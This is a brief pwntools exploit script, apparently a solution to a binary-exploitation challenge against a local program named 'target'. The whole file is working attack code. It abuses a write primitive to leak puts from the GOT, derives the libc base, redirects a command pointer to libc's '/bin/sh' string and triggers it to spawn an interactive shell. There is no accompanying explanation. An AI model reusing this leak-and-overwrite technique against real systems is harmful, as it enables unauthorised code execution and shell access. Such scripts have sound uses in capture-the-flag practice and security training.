
from pwn import *

#e = ELF('./a.out')
e = ELF('./target')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#p = process('./a.out')
p = process('./target')

def write(idx, val):
	p.sendlineafter(b'character:\n', b'b')
	p.sendlineafter(b'base): ', str(idx).encode())
	p.sendlineafter(b'0x...): ', hex(val).encode())

def leak():
	p.sendlineafter(b'character:\n', b'c')
	p.recvuntil(b'leak: ')
	return int(p.recvline().strip(), 16)

write(5, e.got['puts'])                      # readptr -> puts@got
libc.address = leak() - libc.sym['puts']     # libc base
log.info('libc base: %#x', libc.address)

write(4, next(libc.search(b'/bin/sh\x00')))  # cmd -> libc /bin/sh
p.sendlineafter(b'character:\n', b'd')      # trigger
p.interactive()
